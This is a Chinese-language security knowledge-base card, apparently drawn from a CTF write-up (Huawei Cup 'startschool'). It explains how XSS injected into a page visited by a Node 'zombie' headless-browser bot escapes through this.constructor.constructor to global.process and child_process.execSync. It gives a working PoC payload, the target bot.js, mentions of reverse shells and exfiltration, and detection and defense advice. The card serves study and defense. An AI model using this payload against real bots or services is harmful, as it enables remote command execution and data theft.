---
id: web-generic-xss-node-bot-zombie-constructor-process-rce
title: Node 实现的 XSS Bot（zombie）中页面脚本逃逸到宿主进程：this.constructor.constructor 取 global.process，mainModule._load 加载 child_process 执行命令
type: scenario
domain: web
path: web/generic/xss
technique: node-bot-xss-constructor-process-escape
tags:
- web
- xss
- bot
- nodejs
- zombie
- sandbox-escape
- constructor-constructor
- child-process
- rce
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-12'
updated: '2026-11-12'
verification:
  verified_by: verifier-V564
  verified_at: '2026-11-12T08:05:51+08:00'
  notes: 已对照原文核对：原文给出华为杯startschool完整Express源码(/do、/view写data.html)与bot.js(zombie require、waitDuration、setCookie admin、visit 127.0.0.1/view)，payload document.write(this.constructor.constructor(...)) 内层为 return(global.process.mainModule.constructor._load(child_process).execSync(ls / > data.html).toString())，与卡一致；卡内bot页面脚本运行在Node进程、constructor.constructor取宿主Function、mainModule.constructor._load等价require、httpOnly Cookie挡不住（命令在bot进程内执行）均与原文逻辑吻合；原文未给bot端执行结果截图，属按源码推导。dedup无同链（binary-pwn-sandbox-escape-nodejs-vm-constructor-constructor共享原语但触发为vm执行用户脚本，属related不同环境）；4张图中无本卡对应图。未复跑；无组件版本，未set-versions。
url: /docs/web/generic/xss/web-generic-xss-node-bot-zombie-constructor-process-rce/
draft: false
kb_aliases:
- zombie bot XSS 逃逸
- XSS Bot Node RCE
- this.constructor.constructor 取 process
- global.process.mainModule._load
- startschool XSS
- Node 无头浏览器 XSS
---

## 一句话结论

当 XSS Bot 用 Node 库（如 `zombie`）渲染并执行页面脚本时，bot 内的页面 JS 实际运行在 Node 进程的 JS 上下文里，攻击者可从 `this.constructor.constructor` 拿到宿主 `Function`，执行 `return global.process` 取回 `process`，再经 `process.mainModule.constructor._load('child_process')` 加载 `child_process` 并 `execSync`——一条 XSS 即可在 bot 进程中执行系统命令，并以 `global.process` 可达的任意方式读写文件/外带数据。

## 原理

- **bot 的渲染器就是 Node 进程**：`zombie` 是纯 Node 实现的无头浏览器，页面 `<script>` 由它在 Node 进程内解析执行；没有浏览器多进程沙箱，脚本的全局对象与 Node 运行时共享上下文。
- **构造函数链拿宿主 Function**：脚本顶层 `this` 的 `constructor` 是宿主 `Object`，`Object.constructor` 是宿主 `Function`；`this.constructor.constructor(code)` 生成在宿主 Realm 求值的函数，因此能访问宿主 `global`，`Function("return global.process")()` 返回 Node 的 `process`。
- **从 process 到命令执行**：`process.mainModule` 是 CommonJS 主模块，`process.mainModule.constructor` 是 `Module`，`_load` 等价于 `require`；`_load('child_process').execSync('cmd')` 在 bot 进程权限下执行系统命令并返回 stdout。原文用 `execSync('ls / > data.html')` 把结果写回 bot 访问的页面文件，攻击者再访问 `/view` 读取，形成回显。
- **CTF 场景（华为杯 startschool）**：Express 的 `/do` 与 `/view` 把用户提交的姓名/年龄/专业/邮箱直接写进 `data.html`；`bot.js` 用 zombie 创建浏览器、设置 `admin` Cookie（`httpOnly: true`，但 zombie 设置的是它自己的 cookie jar）并访问 `http://127.0.0.1/view`。攻击者在 `data.html` 注入 `document.write(this.constructor.constructor(...))`，bot 访问时脚本执行，把 `ls /` 结果覆盖到 `data.html`，攻击者随后读取。
- **为什么 HTTP-only Cookie 挡不住**：脚本不需要读取 Cookie；bot 自己带着管理员 Cookie 访问页面，命令在 bot 进程内执行，直接读文件/执行命令即可。
- **前提**：bot 用 Node 版无头浏览器（zombie/jsdom/vm 类）执行页面 JS；bot 会访问攻击者可控内容；bot 进程有敏感权限（读 flag 文件/内网）。

## 触发条件

- XSS Bot 采用 `zombie` 等 Node 实现的无头浏览器（而非真实 Chromium 多进程浏览器）渲染页面脚本。
- 攻击者可控制 bot 将访问的页面内容（如留言、个人资料、`data.html`）。
- 页面脚本未被 CSP/沙箱阻断内联执行。
- bot 进程可读目标文件/执行命令（CTF 中通常直接可读 flag）。

## 利用步骤

1. 确认 bot 实现：源码中 `require('zombie')`、`browser.visit(...)`、cookie 由 bot 注入。
2. 在可写入并被 bot 访问的页面字段注入脚本：
   `document.write(this.constructor.constructor("return(global.process.mainModule.constructor._load('child_process').execSync('ls / > data.html').toString())")())`
3. 提交后 bot 访问 `/view`，脚本在 bot 的 Node 进程执行，命令输出覆盖 `data.html`。
4. 自己访问 `/view` 读取命令结果；把命令换成 `cat /flag > data.html` 或外带即可。
5. 也可用 `execSync` 反弹 shell / 读写任意文件。

## PoC

```html
<script>
document.write(
  this.constructor.constructor(
    "return(global.process.mainModule.constructor._load('child_process').execSync('ls / > data.html').toString())"
  )()
);
</script>
```

```javascript
// bot.js（目标侧，供识别）
const zombie = require("zombie");
exports.visit = async function () {
  const browser = new zombie({ waitDuration: 5 * 1000, localAddress: 0 });
  browser.setCookie({ name: 'admin', domain: '127.0.0.1', path: '/', httpOnly: 'true' });
  browser.visit("http://127.0.0.1/view", function () { console.log("Visited: ", "http://127.0.0.1/view"); });
};
```

## 变体与关联

- 同原语：[[binary-pwn-sandbox-escape-nodejs-vm-constructor-constructor]]（Node vm 沙箱逃逸，同一 `constructor.constructor` → `process` 链，但触发是应用用 vm 执行用户脚本）；本草稿的触发是 Node 无头浏览器 bot 执行页面 XSS。
- 变体：`jsdom` + `runScripts:'dangerously'`、`phantomjs` 旧版、无沙箱的 `puppeteer` 配置同样可能让页面脚本到达宿主；payload 可换成 `process.mainModule.require('fs')` 读写文件、`require('net')` 外连。
- 关联：[[web-generic-xss-electron-ipc-curl-file-read-bot-cookie]]（Electron 客户端 bot 的另一类逃逸面）。
- 边界：bot 用真实浏览器沙箱、页面脚本被 CSP 禁止内联、Node 版本移除 `process.mainModule`（需改用 `process.binding`/`module.constructor._load` 等变体）时链路受限。

## 检测与防御

- **检测**：bot 进程派生 `child_process`、`data.html` 等静态页被命令输出覆盖；页面内容含 `constructor.constructor`/`mainModule`/`_load('child_process')` 特征；XSS Bot 使用 Node 库的代码审计信号（zombie/jsdom）。
- **防御**：bot 使用真实浏览器 + 独立沙箱运行，禁用 Node 集成；对页面输出做 HTML 编码/CSP；bot 不携带高权限 Cookie 与文件系统权限；对 bot 访问内容做净化。
